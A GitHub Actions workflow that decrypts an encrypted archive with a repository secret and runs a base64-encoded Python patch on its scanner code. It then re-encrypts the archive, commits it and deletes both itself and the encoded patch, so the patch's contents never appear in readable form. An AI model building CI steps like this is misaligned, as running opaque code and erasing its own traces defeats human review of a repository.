name: Apply Amazon 503 technical recovery

on:
  push:
    branches: [main]

permissions:
  contents: write

concurrency:
  group: apply-amazon-503-recovery
  cancel-in-progress: false

jobs:
  apply:
    runs-on: ubuntu-24.04
    timeout-minutes: 12
    environment: runtime
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          persist-credentials: true

      - name: Repack validated Amazon technical recovery
        shell: bash
        env:
          ARCHIVE_KEY: ${{ secrets.ARCHIVE_KEY }}
        run: |
          set -Eeuo pipefail
          umask 077
          test -n "$ARCHIVE_KEY"
          work="$RUNNER_TEMP/amazon-503-recovery"
          mkdir -p "$work/payload"
          printf '%s' "$ARCHIVE_KEY" | gpg --quiet --batch --yes --pinentry-mode loopback \
            --passphrase-fd 0 --decrypt --output "$work/payload.tgz" .assets/node.dat
          tar -xzf "$work/payload.tgz" -C "$work/payload"
          base64 -d .assets/apply_amazon_503_recovery.b64 > "$work/patch.py"
          PAYLOAD_DIR="$work/payload" python "$work/patch.py"
          cd "$work/payload"
          python -m py_compile scanner.py
          tar -czf "$work/updated.tgz" .
          printf '%s' "$ARCHIVE_KEY" | gpg --quiet --batch --yes --pinentry-mode loopback \
            --passphrase-fd 0 --symmetric --cipher-algo AES256 --digest-algo SHA512 \
            --output "$GITHUB_WORKSPACE/.assets/node.dat" "$work/updated.tgz"
          rm -rf "$work"

      - name: Commit payload and remove transient files
        shell: bash
        run: |
          set -Eeuo pipefail
          git config user.name "nowminutes-release"
          git config user.email "nowminutes-release@users.noreply.github.com"
          rm .github/workflows/apply-amazon-503-recovery.yml .assets/apply_amazon_503_recovery.b64
          git add -A
          git commit -m "Recover Amazon technical 503 reads"
          git push origin HEAD:main
